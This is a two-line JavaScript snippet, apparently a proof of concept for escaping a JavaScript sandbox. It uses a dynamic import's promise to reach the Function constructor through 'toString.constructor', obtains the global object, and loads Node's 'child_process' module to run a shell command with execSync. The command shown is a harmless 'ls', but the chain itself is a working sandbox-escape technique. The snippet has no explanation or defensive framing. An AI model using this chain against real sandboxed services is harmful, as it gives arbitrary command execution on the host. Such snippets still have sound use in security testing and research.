```js
let res = import('./foo.js')
res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("ls").toString();
```